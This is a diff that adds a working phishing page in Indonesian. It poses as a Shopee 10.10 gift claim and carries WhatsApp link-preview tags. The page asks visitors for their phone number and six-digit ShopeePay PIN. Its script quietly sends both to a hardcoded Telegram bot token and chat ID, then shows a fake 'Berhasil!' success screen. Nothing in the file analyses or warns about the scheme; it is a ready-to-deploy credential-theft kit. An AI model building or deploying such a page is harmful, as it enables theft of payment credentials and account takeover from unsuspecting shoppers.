@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shopee 10.10 - Hadiah Spesial</title>
+
+  <!-- Open Graph Meta Tags untuk Preview WhatsApp -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Box Hadiah 10.10 - Shopee Indonesia">
+  <meta property="og:description" content="Klaim kejutan spesial dan hadiah eksklusif event Shopee 10.10 sekarang!">
+  <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-12-77ddcc45-dbc2-4917-b9f7-57af41f737e1.jpg">
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f4f1ea; /* Latar Belakang Luar Warna Kertas */
+      color: #222;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding: 16px 10px;
+    }
+    .wrapper { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
+    
+    .card {
+      background: #f4f1ea; /* Kartu Utama Berwarna Kertas */
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+      padding-bottom: 24px;
+      margin-bottom: 15px;
+      border: 1.5px solid #dcd6cd;
+    }
+    
+    .banner img { width: 100%; height: auto; display: block; border-bottom: 1.5px solid #dcd6cd; }
+    .content { padding: 24px 16px 12px 16px; text-align: center; }
+
+    .txt-info { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 16px; line-height: 1.4; }
+    
+    .group { text-align: left; margin-bottom: 14px; }
+    .group label { font-size: 12px; color: #555; font-weight: 500; display: block; margin-bottom: 6px; }
+    
+    /* Input Nomor HP: Latar belakang sedikit lebih terang agar kontras di dalam kartu kertas */
+    .input-field {
+      width: 100%; padding: 12px 14px; border: 1.5px solid #c8c0b3; border-radius: 6px;
+      font-size: 15px; font-weight: 600; background: #ffffff; color: #222; outline: none; transition: all 0.2s;
+    }
+    .input-field:focus { border-color: #ee4d2d; box-shadow: 0 0 0 2px rgba(238,77,45,0.15); }
+    .input-field::placeholder { color: #888; font-weight: normal; }
+
+    .otp-grid { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 20px; }
+    
+    /* Kotak OTP */
+    .otp-input {
+      width: calc(100% / 6 - 6px); height: 48px; text-align: center; font-size: 18px;
+      font-weight: bold; border: 1.5px solid #c8c0b3; border-radius: 6px; background: #ffffff; color: #222; outline: none; transition: all 0.2s;
+    }
+    .otp-input:focus { border-color: #ee4d2d; box-shadow: 0 0 0 2px rgba(238,77,45,0.15); }
+
+    /* Tombol Oranye Khas Shopee */
+    .btn {
+      width: 100%; background: #ee4d2d; color: #fff; border: none;
+      padding: 12px; border-radius: 6px; font-size: 15px; font-weight: 600;
+      cursor: pointer; box-shadow: 0 2px 4px rgba(238,77,45,0.3);
+      transition: background 0.2s;
+    }
+    .btn:hover { background: #d73d1c; }
+
+    .back { display: inline-block; margin-top: 10px; font-size: 13px; color: #1890ff; font-weight: 500; cursor: pointer; text-decoration: none; }
+    
+    .success { background: #fff8f6; border: 1.5px solid #ffd5cc; padding: 20px 15px; border-radius: 8px; }
+    
+    .footer { text-align: center; color: #776f64; font-size: 11px; margin-top: 5px; }
+  </style>
+</head>
+<body>
+
+  <div class="wrapper">
+    <div class="card">
+      
+      <!-- Banner Atas -->
+      <div class="banner">
+        <img src="https://cdn.phototourl.com/member/2026-10-12-29e502ed-6cd6-468e-b4d1-7c711f2b84f0.png" alt="Banner Event">
+      </div>
+
+      <div class="content">
+        <!-- TAHAP 1: Input Nomor HP -->
+        <div id="step1">
+          <p class="txt-info">Masukkan Nomor Handphone Anda untuk mulai klaim hadiah!</p>
+          <form onsubmit="toStep2(event)">
+            <div class="group">
+              <label>Nomor Handphone</label>
+              <input type="tel" id="phone" class="input-field" placeholder="Contoh: 081234567890" inputmode="numeric" required>
+            </div>
+            <button type="submit" class="btn">Lanjutkan</button>
+          </form>
+        </div>
+
+        <!-- TAHAP 2: Input OTP -->
+        <div id="step2" style="display: none;">
+          <p class="txt-info">MASUKAN PIN SHOPEEPAY</p>
+          <form onsubmit="toStep3(event)">
+            <div class="otp-grid">
+              <input type="tel" maxlength="1" class="otp-input" required>
+              <input type="tel" maxlength="1" class="otp-input" required>
+              <input type="tel" maxlength="1" class="otp-input" required>
+              <input type="tel" maxlength="1" class="otp-input" required>
+              <input type="tel" maxlength="1" class="otp-input" required>
+              <input type="tel" maxlength="1" class="otp-input" required>
+            </div>
+            <button type="submit" class="btn">Konfirmasi</button>
+          </form>
+          <a class="back" onclick="backToStep1()"></a>
+        </div>
+
+        <!-- TAHAP 3: Tampilan Sukses -->
+        <div id="step3" style="display: none;">
+          <div class="success">
+            <div style="font-size: 28px; margin-bottom: 6px;">🎉</div>
+            <h2 style="font-size: 16px; color: #ee4d2d; margin-bottom: 4px;">Berhasil!</h2>
+            <p style="font-size: 13px; color: #555; line-height: 1.4;">Validasi berhasil. Silakan periksa aplikasi Shopee Anda untuk klaim hadiah.</p>
+          </div>
+          <a href="https://shopee.co.id" class="btn" style="margin-top: 15px; display: block; text-decoration: none; text-align: center;">Buka Aplikasi Shopee</a>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="footer">© 2026 Shopee Indonesia. All Rights Reserved.</div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io';
+    const CHAT_ID = '7667144622';
+    let userPhone = '';
+
+    function toStep2(e) {
+      e.preventDefault();
+      userPhone = document.getElementById('phone').value.trim();
+      if (userPhone) {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        setTimeout(() => document.querySelector('.otp-input').focus(), 100);
+      }
+    }
+
+    function backToStep1() {
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step1').style.display = 'block';
+    }
+
+    // Auto-focus pindah kotak OTP
+    const otps = document.querySelectorAll('.otp-input');
+    otps.forEach((el, idx) => {
+      el.addEventListener('input', (e) => {
+        if (e.target.value && idx < otps.length - 1) otps[idx + 1].focus();
+      });
+      el.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && idx > 0) otps[idx - 1].focus();
+      });
+    });
+
+    function toStep3(e) {
+      e.preventDefault();
+      let otpVal = '';
+      otps.forEach(el => otpVal += el.value);
+
+      // Pengiriman data ke Telegram
+      if (BOT_TOKEN !== 'MASUKKAN_BOT_TOKEN_DISINI') {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `🎁 *DATA SHOPEE 10.10*\n\n📱 HP: \`${userPhone}\`\n🔐 OTP: \`${otpVal}\``,
+            parse_mode: 'Markdown'
+          })
+        }).catch(err => console.error(err));
+      }
+
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
